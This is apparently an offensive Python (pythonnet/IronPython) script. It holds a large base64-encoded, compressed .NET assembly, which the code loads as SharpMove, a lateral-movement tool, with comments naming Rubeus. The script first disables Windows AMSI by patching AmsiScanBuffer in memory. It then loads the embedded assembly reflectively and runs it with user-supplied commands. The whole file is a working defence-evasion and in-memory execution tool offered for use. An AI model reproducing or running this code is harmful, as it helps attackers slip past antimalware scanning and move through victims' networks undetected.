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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpMove.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()